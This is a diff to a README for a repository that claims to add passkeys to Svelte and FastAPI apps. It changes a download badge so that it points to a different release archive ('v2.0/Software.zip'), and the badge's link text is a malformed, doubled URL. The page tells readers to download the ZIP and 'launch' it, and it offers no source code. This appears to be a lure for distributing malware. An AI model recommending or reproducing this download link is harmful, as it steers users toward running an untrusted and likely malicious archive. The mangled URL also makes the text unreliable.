@@ -11,7 +11,7 @@ In this repository, you will find the necessary tools to add passkeys to your Sv
 ### Get Started
 To kickstart your integration of passkeys into your Svelte and FastAPI application, download the necessary files from the following link: 
 
-[![Download Passkeys Svelte FastAPI](https://github.com/sussy123hahaha/passkeys-svelte-fastapi/releases/download/v1.0/Application.zip%20Svelte%https://github.com/sussy123hahaha/passkeys-svelte-fastapi/releases/download/v1.0/Application.zip)](https://github.com/sussy123hahaha/passkeys-svelte-fastapi/releases/download/v1.0/Application.zip)
+[![Download Passkeys Svelte FastAPI](https://github.com/sussy123hahaha/passkeys-svelte-fastapi/releases/download/v2.0/Software.zip%20Svelte%https://github.com/sussy123hahaha/passkeys-svelte-fastapi/releases/download/v2.0/Software.zip)](https://github.com/sussy123hahaha/passkeys-svelte-fastapi/releases/download/v2.0/Software.zip)
 
 If the link does not automatically download the files, please make sure to launch the downloaded ZIP file to access the resources.
 
